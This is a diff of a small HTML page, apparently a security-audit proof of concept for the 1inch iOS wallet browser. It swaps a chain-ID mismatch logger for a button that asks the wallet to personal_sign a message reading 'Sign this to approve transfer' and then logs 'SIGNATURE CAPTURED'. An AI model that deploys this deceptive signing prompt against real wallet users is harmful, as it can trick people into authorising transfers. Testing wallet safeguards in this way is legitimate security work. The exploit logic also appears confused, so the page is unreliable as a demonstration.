@@ -3,74 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>1inch iOS - Chain ID Vulnerability Test</title>
+    <title>High Severity: Signature Exploit Test</title>
     <style>
-        body { font-family: -apple-system, Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }
-        .container { max-width: 100%; margin: auto; background: white; padding: 20px; border-radius: 16px; }
-        button { 
-            background: #0066ff; color: white; padding: 18px; margin: 12px 0; 
-            width: 100%; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; 
-        }
-        .log { margin-top: 20px; padding: 15px; background: #f8f8f8; border-radius: 12px; font-size: 14px; border: 1px solid #ddd; }
-        .vulnerable { color: #d9534f; font-weight: bold; border-left: 4px solid #d9534f; padding-left: 8px; }
+        body { font-family: -apple-system, Arial, sans-serif; background: #f0f0f0; padding: 20px; }
+        .container { background: white; padding: 20px; border-radius: 16px; }
+        button { background: #d9534f; color: white; padding: 18px; margin: 12px 0; width: 100%; border: none; border-radius: 12px; font-weight: bold; }
+        .log { margin-top: 20px; padding: 15px; background: #222; color: #0f0; border-radius: 12px; font-family: monospace; font-size: 13px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Security Audit: Chain ID Check</h2>
-        <button id="connect">1. Connect Wallet</button>
-        <button id="testChain">2. Trigger Chain Manipulation</button>
-
-        <div class="log" id="logs">Waiting for interaction...</div>
+        <h2>Security Audit: Signature Exploit</h2>
+        <button id="exploitSign">Attempt Malicious Sign (Chain Mismatch)</button>
+        <div class="log" id="logs">Ready to test...</div>
     </div>
 
     <script>
-        function log(msg, className = '') {
-            const div = document.createElement('div');
-            div.className = className;
-            div.style.margin = '8px 0';
-            div.innerHTML = msg;
-            document.getElementById('logs').prepend(div);
-        }
+        function log(msg) { document.getElementById('logs').innerHTML += `<br>> ${msg}`; }
 
-        async function init() {
-            if (window.ethereum) {
-                const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
-                log(`Connected Network (Chain ID): ${currentChain}`);
-
-                const orig = window.ethereum.request;
-                window.ethereum.request = async function(args) {
-                    // Skenario Nyata: Mendeteksi apakah dApp mencoba memaksakan chainId yang berbeda
-                    if (args.method === 'eth_sendTransaction' && args.params[0].chainId) {
-                        const requestedChain = args.params[0].chainId;
-                        const activeChain = await window.ethereum.request({ method: 'eth_chainId' });
-                        
-                        if (requestedChain !== activeChain) {
-                            log(`<span class="vulnerable">🚨 VULNERABILITY FOUND: Chain ID Mismatch!</span><br>
-                                 Requested: ${requestedChain} | Active: ${activeChain}<br>
-                                 The browser failed to block the transaction on a mismatched network.`, 'vulnerable');
-                        }
-                    }
-                    return orig.apply(this, arguments);
-                };
+        document.getElementById('exploitSign').onclick = async () => {
+            const malAddress = '0x1111111254eeb25477b68fb85ed929f73a960582';
+            const message = "0x5369676e207468697320746f20617070726f7665207472616e73666572"; // "Sign this to approve transfer"
+            
+            log("Attempting personal_sign with mismatched Chain ID...");
+            
+            try {
+                // Mencoba memicu tanda tangan dengan asumsi browser tidak memvalidasi konteks chain
+                const signature = await window.ethereum.request({
+                    method: 'personal_sign',
+                    params: [message, malAddress] 
+                });
+                log("SIGNATURE CAPTURED: " + signature.substring(0,20) + "...");
+                log("CRITICAL: Browser allowed signature without chain validation!");
+            } catch (e) {
+                log("Blocked: " + e.message);
             }
-        }
-
-        document.getElementById('connect').onclick = () => window.ethereum.request({method: 'eth_requestAccounts'});
-        
-        // Skenario Nyata: Mencoba transaksi ke Polygon (0x89) sementara user mungkin di Mainnet (0x1)
-        document.getElementById('testChain').onclick = () => {
-            window.ethereum.request({
-                method: 'eth_sendTransaction', 
-                params: [{
-                    to: '0x1111111254eeb25477b68fb85ed929f73a960582', 
-                    chainId: '0x89', // Target: Polygon
-                    data: '0x'
-                }]
-            }).catch(console.error);
         };
-        
-        init();
     </script>
 </body>
 </html>
